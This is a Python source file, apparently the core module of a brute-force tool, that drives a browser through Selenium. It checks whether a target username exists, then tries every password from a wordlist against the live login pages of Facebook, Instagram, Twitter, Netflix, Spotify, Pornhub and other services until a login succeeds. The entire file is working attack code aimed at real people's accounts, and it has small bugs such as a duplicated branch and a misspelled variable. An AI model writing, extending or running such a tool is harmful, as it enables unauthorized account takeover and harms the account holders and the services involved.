 # -*- coding: utf-8 -*-

'''
web.py - Core module for web-based services bruteforce.

Category: Core 
Description: 
    This module provides the methods for bruteforcing web-based services.
    Most of these are built upon the Selenium library for webscraping and manipulation. 
    These include:
    - facebook
    - instagram
    - twitter
    - meetme
    - pornhub
    - chaturbate
    - netflix
    - yesmovies
    - huntedcow
    - spotify
    - fubar
    
    These are some of the more common web services that have presented vulnerabilities in
    their authentication in the past. NOTE that rate-limiting may be present within their
    respective login forms, so timeouts delays are reinforced.

Dependencies: main > selenium

Version: v1.0.0
Author: nycto
License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0

'''

from src.main import *

# Assert: If specified string is NOT found, that means that user has succcessfully logged in.
# The specified string usually means that the search query is erroneous, meaning that no 
# page for the specified user exists.

class WebBruteforce(object):
    def __init__(self, service, username, wordlist, delay):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay

    def execute(self):
        print P + "[*] Checking if username exists..." + W
        if self.usercheck(self.username, self.service) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        print "Using %s seconds of delay. Default is 1 second" % self.delay
        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)

    def usercheck(self, username, service):
        driver = webdriver.Firefox()
        try:
            if service == "facebook":
                driver.get("https://www.facebook.com/" + username)
                assert (("Sorry, this page isn't available.") not in driver.page_source)
                driver.close()
            elif service == "twitter":
                driver.get("https://www.twitter.com/" + username)
                assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
                driver.close()
            elif service == "instagram":
                driver.get("https://www.instagram.com/" + username)
                assert (("Sorry, this page isn't available.") not in driver.page_source)
                driver.close()
            elif service == "meetme":
                driver.get("https://www.meetme.com/" + username)
                assert (("Sorry User Doesn't Exist.") not in driver.page_source)
            elif service == "pornhub":
                driver.get("https://www.pornhub.com/" + username)
                assert (("Sorry User Not Known.") not in driver.page_source)
            elif service == "chaturbate":
                driver.get("https://www.chaturbate.com/" + username)
                assert (("Sorry User Not Known.") not in driver.page_source)
            elif service == "netflix":
                driver.get("https://www.netflix.com/" + username)
                assert (("Sorry User Not Known.") not in driver.page_source)
            elif service == "yesmovies":
                driver.get("https://www.yesmovies.to/" + username)
                assert (("Sorry User Not Known.") not in driver.page_source)
            elif service == "huntedcow":
                driver.get("https://www.huntedcow.com/" + username)
                assert (("Sorry Not Known.") not in driver.page_source)
            elif service == "spotify":
                driver.get("https://www.spotify.com/" + username)
                assert (("Sorry User Not Known.") not in driver.page_source)
            elif service == "fubar":
                driver.get("https://www.fubar.com/" + username)
                assert (("Sorry User Not Known.") not in driver.page_source)
        except AssertionError:
            return 1


    def webBruteforce(self, username, wordlist, service, delay):
        driver = webdriver.Firefox()
        if service == "facebook":
            driver.get("https://touch.facebook.com/login?soft=auth/")
        elif service == "twitter":
            driver.get("https://mobile.twitter.com/session/new")
            sleep(delay * 2) # wait for DOM to render
        elif service == "instagram":
            driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
        elif service == "meetme":
            driver.get("https://ssl.meetme.com/session/new")
            
        elif service == "pornhub":
            driver.get("https://www.pornhub.com/login")
            
        elif service == "chaturbate":
            driver.get("http://login.chaturbate.com/auth/login/")
        elif service == "netflix":
            driver.get("https://www.netflix.com/Login?nextpage=")
        elif service == "yesmovies":
            driver.get("https://yesmovies.to/login")
        elif service == "huntedcow":
            driver.get("https://www.huntedcow.com/auth?game=6")
        elif service == "spotify":
                driver.get("https://accounts.spotify.com/en-US/login/?force_classic_login")
        elif service == "spotify":
                driver.get("http://fubar.com/login")
                                   
            

        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                # Find username element dependent on service
                if service == "facebook":
                    elem = driver.find_element_by_name("email")
                elif service == "twitter":
                    elem = driver.find_element_by_name("session[username_or_email]")
                elif service == "instagram":
                    elem = driver.find_element_by_name("username")
                elif service == "meetme":
                    elem = driver.find_element_by_name("username")
                elif service == "pornhub":
                    elem = driver.find_element_by_name("username_or_email")
                elif service == "chaturbate":
                    elem = driver.find_element_by_name("username")
                elif service == "netflix":
                    elem = driver.find_element_by_name("email")
                elif service == "yesmovies":
                    elem = driver.find_element_by_name("username_or_email")
                elif service == "huntedcow":
                    elem = driver.find_element_by_name("email")
                elif service == "spotify":
                    elem = driver.find_element_by_name("username")
                elif service == "fubar":
                    elem = driver.find_element_by_name("email")
                elem.clear()
                elem.send_keys(username)
                
                # Find password element dependent on service
                if service == "facebook":
                    elem = driver.find_element_by_name("pass")
                elif service == "twitter":
                    elem = driver.find_element_by_name("session[password]")
                elif service == "instagram":
                    elem = driver.find_element_by_name("password")
                elif service == "meetme":
                    elem = driver.find_element_by_name("password")
                elif service == "pornhub":
                    elem = driver.find_element_by_name("password")
                elif service == "chaturbate":
                    elem = driver.find_element_by_name("password")
                elif service == "netflix":
                    elem = driver.find_element_by_name("password")
                elif service == "yesmovies":
                    elem = driver.find_element_by_name("password")
                elif service == "huntedcow":
                    elem = driver.find_element_by_name("password")
                elif service == "spotify":
                    elem = driver.find_element_by_name("password")
                elif service == "fubar":
                    elem = driver.find_element_by_name("password")
                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)
                
                sleep(delay) # need to wait for page to load, sleep for delay seconds.

                
                # Check for changes in driver.title 
                if service == "facebook":
                    assert (("Log into Facebook | Facebook") in driver.title)
                elif service == "twitter":
                    assert (("Twitter") in driver.title)
                elif service == "instagram":
                    assert (("Log in — Instagram") in driver.title)
                elif service == "meetme":
                    assert (("Log In - Meetme") in drive.title)
                elif service == "pornhub":
                    assert (("Log Into Pornhub") in driver.title)
                elif service == "chaturbate":
                    assert (("Chaturbate") in driver.title)
                elif service == "netflix":
                    assert (("Netflix") in driver.title)
                elif service == "yesmovies":
                    assert (("YesMovies") in driver.title)
                elif service == "huntedcow":
                    assert (("Hunted Cow") in driver.title)
                elif service == "spotify":
                    assert (("SPOTIFY") in driver.title)
                elif service == "fubar":
                    assert (("Fubar") in driver.title)
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                sleep(delay)

            except AssertionError: 
                # AssertionError: successful login, since we do not see the string in the title, meaning
                # that the page has changed.
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                exit(0)
            except Exception as e:
                print R + ("Error caught! %s" % e) + W                 
                exit(1)


